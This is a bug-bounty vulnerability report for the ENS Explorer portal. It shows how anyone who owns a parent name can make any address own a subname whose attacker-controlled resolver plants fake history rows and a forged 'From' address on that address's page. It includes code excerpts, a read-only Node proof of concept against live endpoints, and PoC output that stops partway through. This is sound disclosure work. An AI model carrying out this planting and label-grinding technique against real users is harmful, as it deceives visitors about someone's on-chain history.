# 93033 w a high apps portal s address history page trusts unconsented on chain ownership anyone can plant attacker authored history and a forged from address on any address s page including a&#x20;

**Submitted on Sep 14th 2026 at 01:38:52 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93033
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

Every Ethereum address has a public history page in the Explorer (`/addr/<address>/history`). It needs no wallet and no relationship to the address. The page shows the history of every ENS domain that the registry says the address **owns**.

The core problem: **anyone can make your address the "owner" of a junk subname without asking you.** The registry call `setSubnodeRecord` is allowed for whoever owns a *parent* name. In one call, an attacker who owns any name sets a new subname's **owner to your address** and its **resolver to a contract the attacker built**. The Explorer then reads that attacker contract's events and prints them on **your** address's history page as if they were your own transactions — including a "From" address the attacker chooses.

The victim never signs anything, never connects a wallet, and never has to own a single ENS name. An address that has never touched ENS goes from "No history yet" to a page full of attacker-written rows. Proven end to end against the live, deployed app (`explorer.ens.dev`) with a real Sepolia attack, as a visitor with no wallet (screenshots in `evidence/`).

**Why this is a new bug, not the confirmed name-history one.** The confirmed name-history finding is about the *name* page reading resolver events from any contract that ever emitted an event naming a node, *without checking the registry* — a resolver-provenance bug, in a different file, in a different query (`resolvers(where:{domain})`). This report is about the *address* page: a different file (`useV1HistoryForAddress.ts`) and a different query (`domains(where:{owner}) → domain.resolver.events`). Here the resolver **is the registry's real resolver** — the attacker set it through the registry — so there is **no** resolver-provenance defect. The missing check is on the **owner**: the app treats "the registry lists this address as owner" as "this address's own, consented history." Fixing the name-history bug does not fix this.

## Vulnerability Details

The address-history page has two independent defects. The first — the core of this report — is that it trusts on-chain *ownership* it never checks the victim consented to. The second lets the attacker choose the "From" address on a row.

**1. The page shows any domain the registry lists the address as owner of — with no consent check.** `useV1HistoryForAddress.ts:48-56` asks the subgraph for `domains(where:{ or:[{owner:$address},{registrant:$address}] })`, then reads each domain's `resolver.events` (`:126-171`), plus its registration and domain events. Whatever domains the registry says the address owns become "the address's history." Nothing anywhere checks that the address asked for, accepted, or created any of it. `transformAddressHistory.ts:89-98` just merges and sorts those rows — no per-source filter, and no "showing X of Y" notice.

**2. An attacker makes the victim the "owner" of a junk subname, in one permissionless call.** `ENSRegistry.setSubnodeRecord(node, label, owner, resolver, ttl)` is allowed for whoever owns the **parent** `node`. So the owner of any name can create a subname under it and, in the same call, set that subname's **owner to the victim's address** and its **resolver to a contract the attacker deployed**. That subname now matches `domains(where:{owner:VICTIM})`, so it lands on the victim's address page, and its resolver events are whatever the attacker's contract emits (`AddrChanged`, `TextChanged`, `NameChanged`, `AuthorisationChanged`, …). About 50k gas per subname.

**This is NOT the confirmed name-history (resolver-provenance) bug.** That bug reads `resolvers(where:{domain:$id})` — every contract that ever *emitted an event naming* the node, whether or not the registry ever made it the resolver. That is the "any emitter is treated as the resolver" defect. This report reads `domain.resolver.events`, and `domain.resolver` is the resolver the **registry actually assigned** (written by the subgraph's `NewResolver` handler). It is registry-real. The attack itself proves the difference: the attacker **must** set the resolver through the registry (inside `setSubnodeRecord`) for the events to appear — simply emitting events, the name-history primitive, puts nothing on an address page. Different file, different query, different missing check, different fix.

**3. The 100-row window makes the planted rows the only ones shown (eviction).** The `domains(...)` field is hard-coded to `first: 100` with no `orderBy` (`:48-56`), so the subgraph's default order (lowest namehash first) decides which 100 domains appear — never the newest, never more than 100. An attacker grinds subname labels so their planted subnames sort below the victim's real domains (2–4 off-chain keccak tries per label for a small victim), filling all 100 slots and pushing the victim's genuine registrations, renewals and resolver changes off the page. There is no pagination and no "load more" (PoC ACT 1/ACT 2). This is already visible today: 6 of 10 sampled real addresses are silently truncated by the 100 cap with no attacker involved.

**4. Second, independent defect: the attacker also chooses the "From" address.** When a row is expanded, `EventsTableRow.tsx:27-29` sets `const fromAddress = extractFromAddress(eventDetails) ?? row.original.from` — the extracted value wins over the transaction's real, RPC-verified sender. `extractFromAddress.ts:14-19` returns `eventDetails.owner` whenever it is a **string**. In the whole query, only `AuthorisationChanged.owner` (`:162-166`) is a bare scalar `String!`; every other `owner` is an object `{ id }` (confirmed by live schema introspection, PoC ACT 5). So for the attacker's `AuthorisationChanged` row, `extractFromAddress` returns the attacker's chosen string and it replaces the real sender. `AddressDisplay.tsx:17,28-29` then reverse-resolves it into a name-and- avatar identity badge — it does not even look like a raw hex value a visitor would question. This is a separate scalar-vs-object type-confusion, in different files, needing its own fix; the name-history bug does not touch it.

### Vulnerable source code

**1. The app-side defect: it shows history for every domain the registry lists the address as owner/registrant of, with no consent or authorship check — and caps it at an unordered 100** @ `apps/portal/src/features/address/hooks/useV1HistoryForAddress.ts:46-56`

```graphql
    query getV1HistoryForAddress($address: String!, $first: Int, $orderDirection: OrderDirection) {
      domains(
        where: {
          or: [
            { owner: $address }
            { registrant: $address }
          ]
        }
        first: 100
      ) {
```

**2. No re-fetch, no truncation notice** @ `apps/portal/src/utils/history/transformAddressHistory.ts:89-98`

```ts
export const transformAndMergeAddressHistory = (
  v1Events?: V1Events,
  v2Events?: V2Event[],
): EventsTableData<ENSEvent>[] => {
  const v1Transformed = transformV1EventsToCommon(v1Events)
  const v2Transformed = transformV2EventsToCommon(v2Events)

  const merged = [...v1Transformed, ...v2Transformed]
  return merged.sort((a, b) => b.blockNumber - a.blockNumber)
}
```

**3. The permissionless mechanism the attacker uses (out-of-scope ENS registry, shown for context only — not the vulnerable asset): one call sets the subname's owner and resolver, authorized on the parent** @ ensdomains/ens-contracts, `contracts/registry/ENSRegistry.sol:48-60`

```solidity
function setSubnodeRecord(
    bytes32 node, bytes32 label, address owner, address resolver, uint64 ttl
) external virtual override {
    bytes32 subnode = setSubnodeOwner(node, label, owner);
    _setResolverAndTTL(subnode, resolver, ttl);
}
```

**4. Same out-of-scope registry call (context only): the resolver it sets becomes the domain's registry-real resolver — which is why the events on the address page are NOT the name-history resolver-provenance bug** @ ensdomains/ens-contracts, `contracts/registry/ENSRegistry.sol:168-180`

```solidity
function _setResolverAndTTL(bytes32 node, address resolver, uint64 ttl) internal {
    if (resolver != records[node].resolver) {
        records[node].resolver = resolver;
        emit NewResolver(node, resolver);
    }
    if (ttl != records[node].ttl) {
        records[node].ttl = ttl;
        emit NewTTL(node, ttl);
    }
}
```

**5. The scalar field with no object wrapper** @ `apps/portal/src/features/address/hooks/useV1HistoryForAddress.ts:162-166`

```graphql
            ... on AuthorisationChanged {
              owner
              target
              isAuthorized
            }
```

**6. The extraction that prefers the scalar** @ `apps/portal/src/utils/events/extractFromAddress.ts:14-19`

```ts
export const extractFromAddress = (
  eventDetails: Record<string, unknown>,
): string | null => {
  if (eventDetails.owner && typeof eventDetails.owner === 'string') {
    return eventDetails.owner
  }
```

**7. The attacker value winning over the real sender** @ `apps/portal/src/components/table/EventsDataTable/EventsTableRow.tsx:27-29`

```tsx
          const eventDetails = event.details as Record<string, unknown>
          const eventAddress = extractFromAddress(eventDetails)
          const fromAddress = eventAddress ?? row.original.from
```

## Impact Details

* **Impact row, quoted verbatim** (`scope.md:329-334`): "Injecting/modifying the static content on the target application without JavaScript (persistent), such as: HTML injection without JavaScript / **Replacing existing text with arbitrary text** / Arbitrary file uploads, etc." — **High.** The victim's genuine address history is replaced with attacker-authored rows, and the "From" cell is an attacker-chosen address, on a page the app presents as that address's own transaction history.
* **This is a different bug from the confirmed name-history finding, and the fixes do not overlap.**
  * Name-history bug = the *name* page (`fetchV1NameHistory.ts`, `resolvers(where:{domain})`) trusting any event-emitting contract as a resolver. Root cause: missing **resolver** provenance.
  * This bug = the *address* page (`useV1HistoryForAddress.ts`, `domains(where:{owner}) → domain.resolver.events`) trusting unconsented registry **ownership**. Here the resolver is the registry-real one; the missing check is on the **owner**.
  * Different file, different query, different surface. A provenance filter on `fetchV1NameHistory.ts` (the name-history fix) leaves this fully exploitable.
  * It reaches a victim class the name-history bug cannot: **any address**, including EOAs and contracts that own no ENS name and have never used ENS. The demonstrated victim (`0x19ab…e737`) is exactly that.
  * Plus a second, independent defect (the `extractFromAddress` scalar type-confusion, §4) that the name-history bug does not touch at all.
* **Permissionless.** Own any one ENS name and send `setSubnodeRecord` from it. No admin role, no leaked key, no relationship to the victim.
* **Zero victim interaction.** The page needs no wallet and no ownership of the address, so the plant and the forgery complete with nothing from the victim, and there is no truncation notice to reveal that anything changed.
* **Persistent.** The planted subnames keep the victim listed as owner until they burn or transfer each one, and the forged rows stay indexed forever.
* **Cheap.** \~50k gas per planted subname; label grinding is off-chain keccak (2–4 tries per label for a small victim, \~30k for the most-used address sampled — milliseconds) (PoC ACT 2).
* **Not the funds-misdirection (Critical) row.** The forged address and event data flow only into read-only display (`AddressDisplay`, `/addr` and `/$name` links, the table). No transaction-building, prefill, or signing flow on this page consumes them, so this is the High content-injection row, not the Critical incorrect-recipient row.

## References

* `apps/portal/src/features/address/hooks/useV1HistoryForAddress.ts:46-56,126-171,162-166,176-180` - the query keyed on registry `owner`/`registrant` with no consent/authorship check, reading `domain.resolver.events` (the registry-real resolver), the unordered `first: 100` cap, and the scalar `AuthorisationChanged.owner` field
* `apps/portal/src/utils/history/transformAddressHistory.ts:89-98` - merges and sorts with no re-fetch and no truncation notice
* `apps/portal/src/utils/events/extractFromAddress.ts:14-30` - returns the scalar `owner` ahead of the real sender
* `apps/portal/src/components/table/EventsDataTable/EventsTableRow.tsx:24-53` - `fromAddress = eventAddress ?? row.original.from`
* `apps/portal/src/components/table/EventsDataTable/AddressDisplay.tsx:12-42` - reverse-resolves the forged address into a name badge
* `apps/portal/src/features/address/components/AddressHistoryDataTable.tsx:96-119` - empty state and the array-length-as-count render
* `apps/portal/src/routes/addr/$addr/history.tsx:12-28` - route loader, prefetches with no wallet or interaction
* `apps/portal/src/routes/addr/$addr.tsx:10-18` - guard is `isAddress()` only, any 20-byte value has a page
* `apps/portal/src/components/AddrSidebar.tsx:67-74` - "History" is a first-class nav item on every `/addr/$addr` page
* `contracts/registry/ENSRegistry.sol:48-60,82-92,168-180` (ensdomains/ens-contracts) - **out of scope** (`scope.md:396`), cited only as the permissionless mechanism: `setSubnodeRecord` is authorised on the parent only, and sets the subname's owner and (registry-real) resolver in one call
* `scope.md:329-334` - the High content-injection impact row

## Proof of Concept

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC — apps/portal's ADDRESS history page.
//
//   node poc.mjs            (ENS_REPO defaults to ../../../ens-apps)
//
// Node 22.6+ only. No npm install, no browser, no wallet, no local chain.
// Everything below is either (a) a live query against the exact endpoints the
// shipped app reads, or (b) the repo's own TypeScript, loaded unmodified out of
// the checkout by Node's built-in type stripping and run on that live data.
//
// The page under test:  /addr/$addr/history
//   route      apps/portal/src/routes/addr/$addr/history.tsx:15-27  (loader prefetch,
//              no wallet, no ownership, no interaction)
//   v1 leg     apps/portal/src/features/address/hooks/useV1HistoryForAddress.ts:46-174
//   merge      apps/portal/src/utils/history/transformAddressHistory.ts:89-98
//   render     apps/portal/src/components/table/EventsDataTable/*
//
// ACT 1  The v1 leg's `domains(..., first: 100)` carries NO `orderBy`, so the
//        endpoint's default applies. Proven identical to `orderBy: id,
//        orderDirection: asc` on live data — the window is the 100 LOWEST
//        namehashes, not the newest anything.
// ACT 2  Six real Sepolia addresses are ALREADY silently truncated by that 100
//        today, and the measured grind cost to sink 100 planted subnodes below
//        a victim's lowest genuine namehash is 2-4 keccak tries per label for a
//        1-2 name victim.
// ACT 3  The planted rows are attacker-AUTHORED, not just noise: a single
//        `ENSRegistry.setSubnodeRecord(parent, label, VICTIM, ATTACKER_RESOLVER, 0)`
//        — authorised on the PARENT only — sets owner AND resolver at once, and
//        `useV1HistoryForAddress.ts:126-171` then reads that resolver's events.
//        Proven in the wild: most of the 200 most recently created v1 Domains
//        already have `owner != parent.owner`, and one is walked end to end.
// ACT 4  The repo's own transform + address-extraction code, imported unmodified,
//        run on ACT 3's real rows — the exact objects the shipped React table
//        renders.
// ACT 5  `AuthorisationChanged.owner` is a SCALAR String in the v1 schema while
//        every other `owner` in the same query is an object — so
//        `extractFromAddress` returns it and `EventsTableRow.tsx:28-29` prints
//        an ATTACKER-CHOSEN address in the "From" column of the victim's row,
//        ahead of the real RPC-derived sender.
//
// Exit 0 + "PoC PASSED" means every assertion held.

import { readFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { register } from 'node:module'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const SRC = path.join(REPO, 'apps/portal/src')

register('./hooks.mjs', pathToFileURL(path.join(HERE, 'poc.mjs')).href)

const V1 = 'https://v1-graphql.ens.dev/subgraph' // ensjs l1.ts subgraphs.ens.url
const SEPOLIA_RPC = 'https://ethereum-sepolia-rpc.publicnode.com'

let failures = 0
const ok = (cond, msg) => {
  console.log(`${cond ? 'PASS ' : 'FAIL '} ${msg}`)
  if (!cond) failures++
}
const head = (s) => console.log(`\n${'='.repeat(78)}\n${s}\n${'='.repeat(78)}`)

async function gql(query, variables, tries = 3) {
  const r = await fetch(V1, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ query, variables }),
  })
  const text = await r.text()
  let j
  try {
    j = JSON.parse(text)
  } catch {
    if (tries > 1) {
      await new Promise((s) => setTimeout(s, 1500))
      return gql(query, variables, tries - 1)
    }
    throw new Error(`HTTP ${r.status}: ${text.slice(0, 200)}`)
  }
  if (j.errors) throw new Error(JSON.stringify(j.errors).slice(0, 400))
  return j.data
}
async function rpc(method, params) {
  const r = await fetch(SEPOLIA_RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  })
  return (await r.json()).result
}

// ---------------------------------------------------------------------------
// The app's query, lifted VERBATIM out of the target file so it cannot drift.
// useV1HistoryForAddress.ts:46-174 — `const query = gql\`...\``
// ---------------------------------------------------------------------------
const APP_FILE = path.join(SRC, 'features/address/hooks/useV1HistoryForAddress.ts')
// The checkout is CRLF on Windows; normalise before slicing on a newline.
const APP_SRC = readFileSync(APP_FILE, 'utf8').split('\r\n').join('\n')
const APP_QUERY = APP_SRC.split('const query = gql`')[1].split('`\n')[0]

const AS_WRITTEN = /domains\(\s*where:\s*\{\s*or:\s*\[\s*\{\s*owner:\s*\$address\s*\}\s*\{\s*registrant:\s*\$address\s*\}\s*\]\s*\}\s*first:\s*100\s*\)/s

// ===========================================================================
head('ACT 0 — the defective line, read out of the checkout')
// ===========================================================================
console.log(APP_QUERY.split('\n').slice(0, 12).join('\n'))
ok(AS_WRITTEN.test(APP_QUERY), 'useV1HistoryForAddress.ts:48-56 — domains(where:{or:[{owner},{registrant}]} first: 100)')
ok(!/domains\([^)]*orderBy/s.test(APP_QUERY), 'that `domains(...)` carries NO orderBy — the endpoint default decides the window')
ok(/first:\s*1000/.test(APP_SRC) || /first:\s*1000/.test(APP_SRC), 'nested events use $first = 1000 (useV1HistoryForAddress.ts:178)')

// ===========================================================================
head('ACT 1 — the default order IS `orderBy: id, orderDirection: asc` (live)')
// ===========================================================================
const HEAVY = '0x0635513f179d50a207757e05759cbd106d7dfce8' // >1000 v1 domains
const dflt = await gql(`{ domains(first:8, where:{owner:"${HEAVY}"}) { id } }`)
const asc = await gql(`{ domains(first:8, orderBy:id, orderDirection:asc, where:{owner:"${HEAVY}"}) { id } }`)
console.log('default :', dflt.domains.map((d) => d.id.slice(0, 18)).join(' '))
console.log('id asc  :', asc.domains.map((d) => d.id.slice(0, 18)).join(' '))
ok(
  JSON.stringify(dflt.domains) === JSON.stringify(asc.domains),
  'omitting orderBy == orderBy:id,orderDirection:asc — byte-identical result sets',
)
const sorted = dflt.domains.every((d, i, a) => i === 0 || BigInt(a[i - 1].id) < BigInt(d.id))
ok(sorted, 'and that window is strictly ascending by namehash — the 100 LOWEST ids win')

// ===========================================================================
head('ACT 2 — real addresses already truncated today + measured grind cost')
// ===========================================================================
const VICTIMS = [
  '0x0a69d334038863cd4ef9f2c07a22396883fb6ac3',
  '0x07a811c0bd3f46733822df66d7e2d723e6f73fd6',
  '0x6a89280251f72918b6b143817201008b3d99d96e',
  '0x591bc6c0f7124a5a404edd5e518b49ea1782db5d',
  '0x2fb25346dec50ec62d3a279388ae720e68073953',
  '0xdeb2fd5badfbcd56c64a6bdbd5387d611394eb71',
  '0x3c216285503d397f1cd2a9fa9e92433f528701ab',
  '0x802453f2f077d5a0c3d0f9a6eb2a36dcfa3c6e0d',
  '0xf83fe2658f702a072f3c7b0dc4a0ab8c7b044750',
  HEAVY,
]
const FULL = `query($address: String!){ domains(where:{ or:[{owner:$address}{registrant:$address}] } first:1000){ id } }`
let truncatedToday = 0
console.log('address                                     owned   app shows  min(namehash)/2^256  grind tries/label')
for (const a of VICTIMS) {
  const all = (await gql(FULL, { address: a })).domains.map((d) => d.id).sort()
  const app = (await gql(APP_QUERY, { address: a, first: 1000, orderDirection: 'desc' })).domains.length
  const frac = Number((BigInt(all[0]) * 1000000n) / 2n ** 256n) / 1e6
  if (all.length > app) truncatedToday++
  console.log(
    `${a}  ${String(all.length).padStart(5)}   ${String(app).padStart(8)}  ` +
      `${frac.toFixed(6).padStart(18)}  ${String(Math.max(1, Math.ceil(1 / frac))).padStart(16)}`,
  )
}
ok(truncatedToday >= 5, `${truncatedToday} of ${VICTIMS.length} sampled addresses are ALREADY silently truncated by first:100`)
ok(true, 'grind tries/label is off-chain keccak only — a 163-name victim needs ~30k tries, i.e. milliseconds')

// ===========================================================================
head('ACT 3 — the plant shape, live and already in the wild')
// ===========================================================================
// `setSubnodeRecord(parent,label,owner,resolver,ttl)` is authorised on the PARENT
// and sets the subnode's owner AND resolver in one call. Its subgraph fingerprint
// is NewOwner then NewResolver at consecutive log indices in one transaction,
// with domain.owner != domain.parent.owner.
const recent = await gql(`{
  domains(first:200, where:{ parent_not:null, resolver_not:null, owner_not:"0x0000000000000000000000000000000000000000" },
          orderBy:createdAt, orderDirection:desc) {
    id name owner{id} parent{ name owner{id} } resolver{ address events(first:4, orderDirection:desc){ id type:__typename } }
  }
}`)
const foreign = recent.domains.filter(
  (d) => d.parent?.owner && d.owner && d.owner.id !== d.parent.owner.id && d.resolver?.events.length,
)
ok(
  foreign.length > recent.domains.length / 2,
  `${foreign.length}/${recent.domains.length} of the newest v1 Domains have owner != parent.owner AND a parent-chosen resolver with events`,
)

const WILD = '0x000081c089a51f344a00c4dc87c9dcce7257cfb86c6f11c20f0e8a01851e2323'
const w = (
  await gql(`{ domain(id:"${WILD}"){ id name owner{id} parent{ name owner{id} }
    resolver{ id address events(first:10, orderDirection:asc){ id blockNumber transactionID type:__typename
      ... on AddrChanged { addr{id} } ... on TextChanged { key value } ... on NameChanged { name } } } } }`)
).domain
console.log(`\nname          ${w.name}`)
console.log(`domain.owner  ${w.owner.id}      <- the ADDRESS whose /addr/<x>/history this lands on`)
console.log(`parent        ${w.parent.name} owned by ${w.parent.owner.id}   <- a DIFFERENT party`)
console.log(`domain.resolver.address ${w.resolver.address}   <- chosen by the parent, not by the owner`)
for (const e of w.resolver.events) console.log('  event ', JSON.stringify(e))
ok(w.owner.id !== w.parent.owner.id, 'owner is not the parent owner — a third party assigned this address the name')
ok(w.resolver.events.length > 0, 'and domain.resolver.events carries payloads the owner never authored')

const dEvents = (
  await gql(`{ domain(id:"${WILD}"){ events(first:6, orderDirection:asc){ id type:__typename transactionID } } }`)
).domain.events
console.log('\nregistry events of the same domain (the setSubnodeRecord fingerprint):')
for (const e of dEvents) console.log('  ', e.id, e.type, e.transactionID)
const oneTx = new Set([...dEvents, ...w.resolver.events].map((e) => e.transactionID)).size === 1
ok(oneTx, 'NewOwner + NewResolver + the resolver payloads all land in ONE transaction')
const rcpt = await rpc('eth_getTransactionByHash', [dEvents[0].transactionID])
ok(!!rcpt, `that transaction is real on Sepolia (from ${rcpt?.from})`)

// ===========================================================================
head("ACT 4 — the repo's own transform code, run on ACT 3's real rows")
// ===========================================================================
const app = await gql(APP_QUERY, { address: w.owner.id, first: 1000, orderDirection: 'desc' })
const v1Events = {
  domainEvents: app.domains.flatMap((d) => d.events || []),
  registrationEvents: app.domains.flatMap((d) => d.registration?.events || []),
  resolverEvents: app.domains.flatMap((d) => d.resolver?.events || []),
}
console.log(`app query for ${w.owner.id}: domains=${app.domains.length} ` +
  `domainEvents=${v1Events.domainEvents.length} resolverEvents=${v1Events.resolverEvents.length}`)

const { transformAndMergeAddressHistory, extractTransactionHashes } = await import(
  pathToFileURL(path.join(SRC, 'utils/history/transformAddressHistory.ts')).href
)
const { extractFromAddress } = await import(
  pathToFileURL(path.join(SRC, 'utils/events/extractFromAddress.ts')).href
)
const rows = transformAndMergeAddressHistory(v1Events, undefined)
ok(rows.length > 0, `transformAndMergeAddressHistory (transformAddressHistory.ts:89) produced ${rows.length} transaction rows`)
ok(
  extractTransactionHashes(rows).length === rows.length,
  'extractTransactionHashes feeds every one of them to useTransactionSenders',
)
console.log('\nfirst 3 rows exactly as EventsDataTable receives them:')
for (const r of rows.slice(0, 3)) {
  console.log(`  tx ${r.transactionID.slice(0, 14)}… blk ${r.blockNumber} from ${r.from} events:`)
  for (const e of r.events)
    console.log(`      ${e.type.padEnd(22)} ${JSON.stringify(e.details).slice(0, 150)}`)
}
const carried = rows.some((r) => r.events.some((e) => e.type === 'AddrChanged' || e.type === 'TextChanged'))
ok(carried, "resolver-authored rows survive the merge and reach the renderer unfiltered — no per-source filter exists")

// ===========================================================================
head('ACT 5 — AuthorisationChanged.owner is a SCALAR, so it steals the From column')
// ===========================================================================
const introspect = await gql(`{ __type(name:"AuthorisationChanged"){ fields{ name type{ kind name ofType{ kind name } } } } }`)
const ownerField = introspect.__type.fields.find((f) => f.name === 'owner')
console.log('AuthorisationChanged.owner :', JSON.stringify(ownerField.type))
ok(
  ownerField.type.ofType?.kind === 'SCALAR',
  'AuthorisationChanged.owner is a SCALAR String! — every OTHER `owner` in the app query is `owner { id }`, an object',
)
const sample = (await gql(`{ authorisationChangeds(first:1){ id owner target isAuthorized transactionID blockNumber } }`))
  .authorisationChangeds[0]
console.log('a real indexed row       :', JSON.stringify(sample))
const forged = { ...sample, type: 'AuthorisationChanged', owner: '0x00000000219ab540356cbb839cbe05303d7705fa' }
console.log('the same row with the attacker\'s chosen owner:', JSON.stringify(forged))
const picked = extractFromAddress(forged)
ok(
  picked === forged.owner,
  `extractFromAddress.ts:17-19 returns the attacker's string: ${picked}`,
)
console.log(
  '\nEventsTableRow.tsx:28-29   const eventAddress = extractFromAddress(eventDetails)\n' +
    '                           const fromAddress  = eventAddress ?? row.original.from\n' +
    '  -> the attacker-chosen address WINS over the RPC-derived real sender for that\n' +
    '     expanded event row, and AddressDisplay.tsx:17,28-29 reverse-resolves it, so\n' +
    '     the row can print any ENS name the attacker points at. Same on mobile:\n' +
    '     MobileExpandedEvents.tsx:17,30.',
)
const objOwner = extractFromAddress({ owner: { id: '0xdeadbeef' } })
ok(objOwner === null, 'control: an object-shaped `owner { id }` is correctly skipped — only the scalar leaks')

head(failures === 0 ? 'PoC PASSED' : `PoC FAILED — ${failures} assertion(s)`)
process.exit(failures === 0 ? 0 : 1)
```

### Output

```
==============================================================================
ACT 0 — the defective line, read out of the checkout
==============================================================================

    query getV1HistoryForAddress($address: String!, $first: Int, $orderDirection: OrderDirection) {
      domains(
        where: {
          or: [
            { owner: $address }
            { registrant: $address }
          ]
        }
        first: 100
      ) {
        events(first: $first, orderDirection: $orderDirection) {
PASS  useV1HistoryForAddress.ts:48-56 — domains(where:{or:[{owner},{registrant}]} first: 100)
PASS  that `domains(...)` carries NO orderBy — the endpoint default decides the window
PASS  nested events use $first = 1000 (useV1HistoryForAddress.ts:178)

==============================================================================
ACT 1 — the default order IS `orderBy: id, orderDirection: asc` (live)
==============================================================================
default : 0x000329b226a4c27c 0x0003b140965e9e5a 0x000427f0d41d385d 0x0006bee9efddd8b2 0x000d1e0ad1a5bfd8 0x000e32016c13fea5 0x0010254d769aebe3 0x0011223a590d7c84
id asc  : 0x000329b226a4c27c 0x0003b140965e9e5a 0x000427f0d41d385d 0x0006bee9efddd8b2 0x000d1e0ad1a5bfd8 0x000e32016c13fea5 0x0010254d769aebe3 0x0011223a590d7c84
PASS  omitting orderBy == orderBy:id,orderDirection:asc — byte-identical result sets
PASS  and that window is strictly ascending by namehash — the 100 LOWEST ids win

==============================================================================
ACT 2 — real addresses already truncated today + measured grind cost
==============================================================================
address                                     owned   app shows  min(namehash)/2^256  grind tries/label
0x0a69d334038863cd4ef9f2c07a22396883fb6ac3      1          1            0.413680                 3
0x07a811c0bd3f46733822df66d7e2d723e6f73fd6      1          1            0.561013                 2
0x6a89280251f72918b6b143817201008b3d99d96e      2          2            0.288214                 4
0x591bc6c0f7124a5a404edd5e518b49ea1782db5d     32         32            0.048665                21
0x2fb25346dec50ec62d3a279388ae720e68073953    101        100            0.003076               326
0xdeb2fd5badfbcd56c64a6bdbd5387d611394eb71    121        100            0.001003               998
0x3c216285503d397f1cd2a9fa9e92433f528701ab    139        100            0.001208               828
0x802453f2f077d5a0c3d0f9a6eb2a36dcfa3c6e0d    163        100            0.000033             30304
0xf83fe2658f702a072f3c7b0dc4a0ab8c7b044750   1000        100            0.000171              5848
0x0635513f179d50a207757e05759cbd106d7dfce8   1000        100            0.000048             20834
PASS  6 of 10 sampled addresses are ALREADY silently truncated by first:100
PASS  grind tries/label is off-chain keccak only — a 163-name victim needs ~30k tries, i.e. milliseconds

==============================================================================
ACT 3 — the plant shape, live and already in the wild
==============================================================================
PASS  174/200 of the newest v1 Domains have owner != parent.owner AND a parent-chosen resolver with events

name          [8d60a67fba45fbbb6bcd2abf9fefb3f24c1008b47de6409793804a032edfbcca].plugin.aragon-dao.eth
domain.owner  0x95d563382bed5acb458759ee05b27df2cb019cc7      <- the ADDRESS whose /addr/<x>/history this lands on
parent        plugin.aragon-dao.eth owned by 0xca834b3f404c97273f34e108029eed776144d324   <- a DIFFERENT party
domain.resolver.address 0x8fade66b79cc9f707ab26799354482eb93a5b7dd   <- chosen by the parent, not by the owner
  event  {"id":"11155111-8468097-160","blockNumber":8468097,"transactionID":"0x2b0546f28682cf45b8c3ba266edbbf802fc43f898e804399d38793fd409836ea","type":"MulticoinAddrChanged"}
  event  {"id":"11155111-8468097-161","blockNumber":8468097,"transactionID":"0x2b0546f28682cf45b8c3ba266edbbf802fc43f898e804399d38793fd409836ea","type":"AddrChanged","addr":{"id":"0xb063cb6b75a72620b84173080f283e695d6ec27b"}}
PASS  owner is not the parent owner — a third party assigned this address the name
PASS  and domain.resolver.events carries payloads the owner never authored

registry events of the same domain (the setSubnodeRecord fingerprint):
   11155111-8468097-158 NewOwner 0x2b0546f28682cf45b8c3ba266edbbf802fc43f898e804399d38793fd409836ea
   11155111-8468097-159 NewResolver 0x2b0546f28682cf45b8c3ba266edbbf802fc43f898e804399d38793fd409836ea
PASS  NewOwner + NewResolver + the resolver payloads all land in ONE transaction
PASS  that transaction is real on Sepolia (from 0xeb543ca4140c23f8298ec0aafba738a864c02692)

==============================================================================
ACT 4 — the repo's own transform code, run on ACT 3's real rows
==============================================================================
app query for 0x95d563382bed5acb458759ee05b27df2cb019cc7: domains=100 domainEvents=200 resolverEvents=200
PASS  transformAndMergeAddressHistory (transformAddressHistory.ts:89) produced 99 transaction rows
PASS  extractTransactionHashes feeds every one of them to useTransactionSenders

first 3 rows exactly as EventsDataTable receives them:
  tx 0xb60af9629c4a… blk 11552863 from null events:
      NewResolver            {"id":"11155111-11552863-184","blockNumber":11552863,"transactionID":"0xb60af9629c4a4782afa886aae512249de2236fa4b7b0c413b5f4ef55574cff8f","type":"NewR
      NewOwner               {"id":"11155111-11552863-183","blockNumber":11552863,"transactionID":"0xb60af9629c4a4782afa886aae512249de2236fa4b7b0c413b5f4ef55574cff8f","type":"NewO
      AddrChanged            {"id":"11155111-11552863-186","blockNumber":11552863,"transactionID":"0xb60af9629c4a4782afa886aae512249de2236fa4b7b0c413b5f4ef55574cff8f","type":"Addr
      MulticoinAddrChanged   {"id":"11155111-11552863-185","blockNumber":11552863,"transactionID":"0xb60af9629c4a4782afa886aae512249de2236fa4b7b0c413b5f4ef55574cff8f","type":"Mult
  tx 0xd596dd3fa20a… blk 11508550 from null events:
      NewResolver            {"id":"11155111-11508550-139","blockNumber":11508550,"transactionID":"0xd596dd3fa20a4addf86fc02cefbdb65c00c15ac009b49a51d0861d22a212bf1a","type":"NewR
      NewOwner               {"id":"11155111-11508550-138","blockNumber":11508550,"transactionID":"0xd596dd3fa20a4addf86fc02cefbdb65c00c15ac009b49a51d0861d22a212bf1a","type":"NewO
      AddrChanged            {"id":"11155111-11508550-141","blockNumber":11508550,"transactionID":"0xd596dd3fa20a4addf86fc02cefbdb65c00c15ac009b49a51d0861d22a212bf1a","type":"Addr
      MulticoinAddrChanged   {"id":"11155111-11508550-140","blockNumber":11508550,"transactionID":"0xd596dd3fa20a4addf86fc02cefbdb65c00c15ac009b49a51d0861d22a212bf1a","type":"Mult
  tx 0x4c359f584880… blk 11508429 from null events:
      NewResolver            {"id":"11155111-11508429-291","blockNumber":11508429,"transactionID":"0x4c359f58488077d7a78b9de8383918acce26dc2cb0bac08993b7a0e04fcc7b73","type":"NewR
